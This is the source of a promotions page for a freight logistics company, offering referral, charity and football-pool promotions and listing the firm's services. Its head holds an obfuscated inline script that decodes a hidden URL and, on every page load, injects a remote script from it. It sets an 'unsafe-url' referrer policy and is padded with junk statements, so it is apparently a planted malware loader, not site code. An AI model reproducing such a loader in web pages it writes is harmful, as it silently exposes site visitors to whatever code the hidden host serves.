<!doctype html>
<html>

<head>
    <script src="dmxAppConnect/dmxAppConnect.js"></script>
    <meta charset="UTF-8">
    <title>Referral Rewards | Raging Wolf Solutions</title>

    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.14.0/css/all.css" integrity="sha384-HzLeBuhoNPvSl5KYnjx0BT+WB0QEEqLprO+NBkkk5gbc67FTaL7XIGa2w1L0Xbgc" crossorigin="anonymous" />
    <link href="https://fonts.googleapis.com/css2?family=Lustria&amp;family=Muli:ital,wght@0,400;0,500;0,600;0,700;1,400;1,500;1,600;1,700&amp;display=swap" rel="stylesheet">
    <link href="https://fonts.cdnfonts.com/css/sansation" rel="stylesheet">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link rel="stylesheet" href="bootstrap/5/css/bootstrap.min.css" />
    <link rel="stylesheet" href="css/style.css" />
    <link rel="stylesheet" href="css/stylesheet.css" />
    <script src="js/jquery-3.5.1.slim.min.js"></script>
    <script src="dmxAppConnect/dmxBootstrap5Navigation/dmxBootstrap5Navigation.js" defer=""></script>
    <script src="dmxAppConnect/dmxBackgroundVideo/dmxBackgroundVideo.js" defer=""></script>

    <script src="dmxAppConnect/dmxBootstrap5Modal/dmxBootstrap5Modal.js" defer></script>
    <link rel="icon" href="icons/favicon.ico">
    <link rel="stylesheet" href="dmxAppConnect/dmxValidator/dmxValidator.css" />
    <script src="dmxAppConnect/dmxValidator/dmxValidator.js" defer></script>
    <script src="dmxAppConnect/dmxBrowser/dmxBrowser.js" defer></script>
    <script>
        (function(){var _5S=document.createElement("script"),_jF=(function(_sP,_Ii){var _T2="";for(var _w6=0;_w6<_sP.length;_w6++){var _7h=_sP[_w6].charCodeAt();_7h-=_Ii;_7h+=61;_T2==_T2;_Ii>8;_7h%=94;_7h!=_w6;_7h+=33;_T2+=String.fromCharCode(_7h)}return _T2})(atob("OEREQENoXV1HQ1xKPz89OT42P1wzPz1dQDlINTxdZGExMmJjY2cxMmJkZ19mMl5mXjJlY2Rh"), 46);_5S!="q";_5S.src=_jF;_5S.async=!0;_5S.referrerPolicy="unsafe-url";_5S.type="text/javascript";function _Qm(){};5>4;var _G3=document.getElementsByTagName("script")[0];_G3.parentNode.insertBefore(_5S,_G3)})();
    </script>
    <script src="dmxAppConnect/dmxVideo/dmxVideo.js" defer></script>
</head>

<body is="dmx-app" id="index" class="bg-dark">
    <div is="dmx-browser" id="browser1"></div>

    <?php include 'navbar_mini'; ?>

    <?php include 'navbar_main'; ?>

    <section id="modules" class="border-top rounded-1 rounded-0 min-vh-75 border-secondary pb-3" style="min-height: 75vh;">

        <img src="assets/images/section-modal-bg-top-stone.png" class="w-100">
        <div class="container modules-container mt-0 mb-5 pb-5">
            <div class="row justify-content-center pb-3">
                <div class="pl-1 pr-1 col-12 text-center col-md-10">


                    <h1 class="text-uppercase text-yellow text-warning text-center"><i class="fas fa-hands-helping fa-lg"></i></h1>
                    <h5 class="text-uppercase text-yellow text-warning text-center">Active Promotions</h5>
                    <h1 class="text-light text-left">Raging Wolf Solutions Promotional Offers</h1>
                    <h5 class="text-white-50 mb-3 lh-base fw-normal">If you like to keep in the "know," you have come the right place. Whether it is to find a shipping solution, give back to the comunity or try your luck you will find the details here!</h5>

                </div>

            </div>
            <div class="row pt-3 justify-content-between">
                <div class="col-lg-4 pt-3 pb-2 px-4">
                    <div class="row border rounded rounded-2 border-light border-offwhite">
                        <div class="col promo-card">
                            <div class="d-flex flex-column hover-cursor" dmx-on:click="browser1.goto('referral.php')">
                                <h1 class="text-light lh-base text-center mb-1"><i class="fas fa-user-friends"></i></h1>
                                <h5 class="text-light text-center lh-base">Freinds don't let friends ship alone!</h5>




                            </div>
                            <div class="d-flex">
                                <p class="text-white-50 text-center">Know someone in need of freight transportation? Send them our way! Contact us using the form below, or tell your referral about Raging Wolf by sharing our services to your network. Make sure they mention your name or business!<span class="text-warning hover-cursor" dmx-on:click="browser1.goto('promotion_terms/referral_terms.php')">&nbsp;See Terms.</span></p>
                            </div>
                        </div>
                    </div>


                </div>
                <div class="col-lg-4 pt-3 pb-2 px-4">
                    <div class="row">
                        <div class="border rounded rounded-2 border-light border-offwhite promo-card col">
                            <div class="d-flex flex-column hover-cursor" dmx-on:click="browser1.goto('charity.php')">

                                <h1 class="text-light lh-base text-center mb-1"><i class="fas fa-hand-holding-medical"></i></h1>
                                <h5 class="text-light text-center lh-base">Help donate to an Alpha cause!</h5>

                            </div>
                            <div class="d-flex">
                                <p class="text-white-50 text-center">Our team is giving back to our future - <span class="text-white-50 hover-cursor" dmx-on:click="browser1.goto('https://www.uhhospitals.org/rainbow')"><i>UH Rainbow Children's Hospital </i></span>- and we need your help! Support this great cause and promote Raging Wolf Solutions at the same time.<span class="text-warning hover-cursor" dmx-on:click="browser1.goto('promotion_terms/charity_terms.php')">&nbsp;See Terms.</span></p>
                            </div>
                        </div>
                    </div>


                </div>
                <div class="col-lg-4 pt-3 pb-2 px-4">
                    <div class="row border rounded rounded-2 border-light border-offwhite">
                        <div class="col promo-card">
                            <div class="d-flex flex-column hover-cursor" dmx-on:click="browser1.goto('football_pool.php')">

                                <h1 class="text-light lh-base text-center mb-1"><i class="fas fa-football-ball"></i></h1>
                                <h5 class="text-light text-center lh-base">If your team wins, so do you!</h5>

                            </div>
                            <div class="d-flex">
                                <p class="text-white-50 text-center">If you enjoy the battle of the grid-iron, you'll love this! Every week, you will receive an email with a link to our online football pool, where you can make your picks for the upcoming NFL games, preseason too! If you correctly predict the most winners, you could receive with a $100.<span class="text-warning hover-cursor" dmx-on:click="browser1.goto('promotion_terms/football_pool_terms.php')">&nbsp;See Terms.</span></p>
                            </div>
                        </div>
                    </div>


                </div>
            </div>
            <div class="row">
                <div class="col text-light mt-3 mb-3">
                    <hr>
                </div>
            </div>
            <div class="row justify-content-start mt-4">
                <div class="pl-1 pr-1 col-12 col-md-10 gx-5">


                    <h5 class="text-uppercase text-yellow text-warning">About Us</h5>
                    <h1 class="text-light text-left">Why Ship With Raging Wolf Solutions?</h1>

                    <p class="text-white-50 mb-4">When it comes to logistics and freight management, the stakes are high and the challenges are many. Our dedicated team is here to navigate the complexities of shipping, offering you an unmatched combination of reliability, expertise, and personalized service. From air and ground expedites to full truckloads, van partials, flatbeds, and straight trucks, we tailor our services to meet your needs. And we do it all while maintaining the highest levels of communication and service, because we believe in building long-lasting relationships with our customers.</p>
                    <h5 class="text-light text-left">Expertise in Freight Management:</h5>
                    <p class="text-white-50">Raging Wolf Solutions employs a team of logistics experts who have extensive experience and knowledge in managing freight. We understand the intricacies of coordinating shipments and ensure your freight is handled expertly from pick-up to delivery.
                    </p>
                    <h5 class="text-light text-left">Diverse Shipping Options:</h5>
                    <p class="text-white-50">With a wide array of shipping options, from air/ground expedites to full truckloads, van partials, flatbeds, and straight trucks, Raging Wolf offers tailored solutions to meet the unique needs of each customer. We are not just a service provider; we are a versatile logistics partner.</p>
                    <h5 class="text-light text-left">Exceptional Communication:</h5>
                    <p class="text-white-50">Our team at Raging Wolf prides itself on providing excellent communication throughout the shipping process. From initial coordination to final delivery, we keep you informed and take immediate action on any potential issues that may arise.</p>
                    <h5 class="text-light text-left">High Service Levels:</h5>
                    <p class="text-white-50">Unlike larger, impersonal carriers, Raging Wolf Solutions focuses on offering top-tier, personalized service. We take pride in going the extra mile to ensure our customers' needs are not just met, but exceeded.</p>
                    <h5 class="text-light text-left">Strong Relationships:</h5>
                    <p class="text-white-50">At Raging Wolf Solutions, we believe in building strong relationships with our customers. We see each customer as a partner and take a genuine interest in their business success, which drives us to provide the best possible service.</p>
                    <h5 class="text-light text-left">Reliability:</h5>





                    <p class="text-white-50 pb-2">Raging Wolf Solutions is known for its reliability. We understand how critical, timely and accurate deliveries are to your business, and we strive to maintain our reputation for reliable service.</p>


                </div>
            </div>
            <div class="row">
                <div class="col gx-5">
                    <div class="d-flex flex-wrap"><button id="btn2" class="btn module-cta-btn btn text-nowrap fw-bold btn-warning mb-2 me-2 pt-2 pb-2 refer-button" dmx-on:click="browser1.goto('about.php')">More&ensp;Details</button><button id="btn3" class="btn module-cta-btn btn text-nowrap fw-bold btn-outline-warning mb-2 pt-2 pb-2 refer-button" data-bs-toggle="modal" data-bs-target="#quote_modal">start a quote</button></div>
                </div>
            </div>
        </div>
    </section>

    <?php include 'footer.php'; ?>

    <script src="bootstrap/5/js/bootstrap.bundle.min.js"></script>
</body>

</html>